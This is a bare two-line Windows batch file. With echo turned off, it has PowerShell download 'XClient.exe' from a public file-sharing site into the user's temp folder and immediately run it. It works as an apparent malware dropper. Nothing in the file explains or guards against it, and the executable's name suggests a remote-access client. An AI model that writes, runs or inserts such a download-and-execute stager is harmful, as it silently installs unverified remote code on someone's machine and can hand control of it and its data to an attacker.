@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://www.upload.ee/download/18146537/88a9def189e720bc9951/XClient.exe' -OutFile '%TEMP%\XClient.exe'; Start-Process '%TEMP%\XClient.exe'"